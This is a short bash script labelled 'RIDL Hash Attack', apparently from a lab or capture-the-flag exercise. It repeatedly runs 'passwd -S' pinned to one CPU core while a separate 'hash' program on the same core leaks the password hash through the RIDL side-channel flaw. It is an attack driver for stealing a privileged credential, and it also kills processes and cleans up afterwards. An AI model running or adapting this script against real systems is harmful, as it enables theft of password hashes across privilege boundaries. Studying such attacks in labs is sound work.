#!/bin/bash

echo "=== RIDL Hash Attack ==="

CORE=${1:-0}
echo "Using CPU core: $CORE"

# Build
make hash

# Clean up any previous runs
pkill -f "passwd -S" 2>/dev/null
rm -f md5_hash.txt

echo "Starting trigger on core $CORE..."
# Solution's exact trigger
(
    while true; do 
        taskset -c $CORE passwd -S $USER > /dev/null 2>&1
    done
) &
TRIGGER_PID=$!

sleep 1

echo "Starting attack..."
# Let hash.c show its own output
taskset -c $CORE ./hash

# Clean up
kill $TRIGGER_PID 2>/dev/null
make clean
